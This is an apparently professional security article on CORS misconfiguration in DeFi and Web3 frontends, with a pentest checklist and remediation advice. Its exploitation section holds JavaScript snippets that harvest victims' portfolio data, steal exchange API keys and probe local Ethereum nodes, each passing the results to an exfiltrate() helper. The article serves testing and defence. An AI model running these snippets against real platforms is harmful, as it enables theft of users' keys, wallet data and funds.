# CORS Misconfiguration in Web3/DeFi Frontends

**Category:** CORS Misconfiguration (Web3-Specific)
**Severity:** High to Critical
**CVSS Range:** 7.0 - 9.8 (depends on what's exposed)

## Attack Description

Web3 applications have unique CORS attack surfaces due to their architecture: separate frontend/API/RPC domains, reliance on browser wallet extensions, and the presence of high-value financial data. DeFi frontends often have permissive CORS to support:

- Multi-domain deployments (app, API, docs, status)
- RPC node access from various origins
- Wallet extension communication
- Bridge interfaces that need cross-origin messaging
- IPFS-hosted frontends on various gateways

These requirements create a broader attack surface than traditional web apps, and the consequences are more severe because the data exposed includes wallet addresses, balances, transaction history, API keys, and potentially transaction signing capabilities.

## Web3 CORS Attack Surfaces

### 1. RPC Endpoint Exposure

Many self-hosted or third-party RPC nodes have wildcard CORS:

```
# RPC nodes often respond with:
Access-Control-Allow-Origin: *
```

While `*` prevents credential forwarding, it still exposes:
- Wallet balances via `eth_getBalance`
- Transaction history via `eth_getTransactionByHash`
- Contract state via `eth_call`
- Pending transactions via `txpool_content` (if unlocked)

**Risk**: Information disclosure for targeted phishing. Attacker learns exact holdings, then crafts convincing scam.

### 2. DeFi Backend APIs

```
Target: api.defi-protocol.com
Endpoints:
  /api/user/profile        -> wallet addresses, email
  /api/user/positions       -> LP positions, balances
  /api/user/history         -> transaction history
  /api/user/api-keys        -> API keys for programmatic access
  /api/user/notifications   -> notification preferences
```

If CORS is misconfigured on these API endpoints, attacker can:
- Map victim's entire DeFi portfolio
- Steal API keys for automated trading
- Read notification settings to disable alerts before attack

### 3. Bridge UI Cross-Origin Issues

Bridge interfaces inherently need cross-origin communication:
- Source chain frontend talks to destination chain API
- Status checks ping multiple RPC endpoints
- Transaction confirmation polls from different origins

Common misconfig: Bridge API trusts all origins from both chains' domains via suffix matching.

### 4. Wallet Frontend Panels

Self-hosted wallet interfaces (e.g., web-based hardware wallet managers):
- Often run on `localhost` or local IP
- May trust `null` origin for `file://` access
- May have wildcard CORS for dev convenience

### 5. NFT Marketplace APIs

```
Target: api.nft-marketplace.com
Endpoints:
  /api/user/collections     -> owned NFTs, floor prices
  /api/user/listings        -> active listings and prices
  /api/user/offers          -> pending offers
  /api/user/activity        -> buy/sell history
```

CORS misconfig + credential forwarding = portfolio dossier for targeted attacks.

## Exploitation Patterns

### Pattern A: Portfolio Dossier Attack

```javascript
// Attacker page: builds complete profile of victim's DeFi activity
async function dossier() {
  const data = {};
  
  // Read from DEX API
  data.positions = await corsRead('https://api.defi-app.com/api/positions');
  
  // Read from lending platform
  data.loans = await corsRead('https://api.lending.com/api/user/loans');
  
  // Read from NFT marketplace
  data.nfts = await corsRead('https://api.nft-market.com/api/user/assets');
  
  // Attacker now has full portfolio view for:
  // 1. Targeted phishing ("We noticed your 50 ETH position...")
  // 2. Liquidation monitoring (front-run liquidatable positions)
  // 3. Social engineering ("We need to verify your wallet 0x...")
  
  exfiltrate(data);
}

async function corsRead(url) {
  const resp = await fetch(url, { credentials: 'include' });
  return resp.json();
}
```

### Pattern B: API Key Theft for Automated Exploitation

```javascript
// If CEX or DeFi aggregator stores API keys:
async function stealKeys() {
  const keys = await fetch('https://api.exchange.com/api/keys', {
    credentials: 'include'
  }).then(r => r.json());
  
  // Attacker now has trading API keys
  // Can place trades, withdraw funds (if key has withdrawal permission)
  exfiltrate(keys);
}
```

### Pattern C: CORS to Internal Node Access

```javascript
// If victim runs local Ethereum node:
// Attacker's page in victim's browser can access localhost
async function probeLocalNode() {
  try {
    const resp = await fetch('http://localhost:8545', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'eth_accounts',
        params: [],
        id: 1
      })
    });
    const accounts = await resp.json();
    // If node has unlocked accounts = game over
    exfiltrate(accounts);
  } catch(e) {
    // Node not running or CORS blocked
  }
}
```

## Zealynx Pentest Checklist for DeFi CORS

### Pre-Assessment
- [ ] Map all domains and subdomains used by the DeFi application
- [ ] Identify API endpoints that handle user data
- [ ] Document cookie attributes (SameSite, HttpOnly, Secure)
- [ ] Note which endpoints require authentication

### CORS Testing
- [ ] Test origin reflection on ALL API endpoints
- [ ] Test null origin acceptance
- [ ] Test subdomain variations (evil.target.com, target.com.evil.com)
- [ ] Test protocol downgrade (http:// vs https://)
- [ ] Test with and without credentials
- [ ] Check if `Vary: Origin` is set on dynamic ACAO responses
- [ ] Test pre-flight bypasses (simple requests with text/plain)

### Web3-Specific Tests
- [ ] Test RPC endpoints for wildcard CORS
- [ ] Test bridge API endpoints from cross-chain origins
- [ ] Test wallet-related API endpoints
- [ ] Check if API key endpoints are CORS-accessible
- [ ] Test internal service communication endpoints
- [ ] Check for local node access from CORS context (localhost:8545, etc.)

### Impact Assessment
- [ ] Can attacker read wallet addresses?
- [ ] Can attacker read balances/positions?
- [ ] Can attacker read/steal API keys?
- [ ] Can attacker perform state-changing actions (CSRF chain)?
- [ ] Can attacker access admin/internal endpoints?

## Remediation for DeFi Platforms

1. **Strict origin whitelist**: Only allow the exact frontend domain(s)
2. **Separate CORS policies per endpoint sensitivity**: Public data endpoints can be more permissive; auth/financial endpoints must be strict
3. **RPC endpoint access**: Use API keys or JWT tokens instead of relying on CORS for security
4. **Bridge APIs**: Validate origins explicitly for each supported chain's frontend domain
5. **Cookie hygiene**: `SameSite=Strict` for session cookies, `HttpOnly` for tokens
6. **CSP headers**: Use Content-Security-Policy to limit which origins the frontend can talk to
7. **Rate limiting**: Detect and block rapid cross-origin data harvesting

## Real Examples

1. **Bitcoin Exchange #1 (PortSwigger, 2016)**: Full origin reflection with credentials on API key endpoint. Attacker could steal all BTC via API key theft.

2. **Bitcoin Exchange #3 (PortSwigger, 2016)**: Null origin accepted. Attacker could steal encrypted wallet backups for offline cracking.

3. **CVE-2025-34291 - Langflow**: AI agent platform (increasingly used in Web3 for automated trading/monitoring). CORS + CSRF = full compromise of all stored API keys and service tokens.

4. **Web3 RPC Misconfiguration (common)**: Infura, Alchemy, and self-hosted nodes often have `Access-Control-Allow-Origin: *`, exposing blockchain queries to any origin. While not credential-sensitive, enables information harvesting.

## Tools for Web3 CORS Testing

- **Corsy** (s0md3v/Corsy) - General CORS scanner
- **CORScanner** (chenjj/CORScanner) - Batch scanning
- **of-CORS** (trufflesecurity/of-cors) - Internal network CORS exploitation
- **Burp Suite Pro** - With CORS-specific scanner rules
- **Custom scripts** - Python/bash for testing origin mutations against specific API endpoints
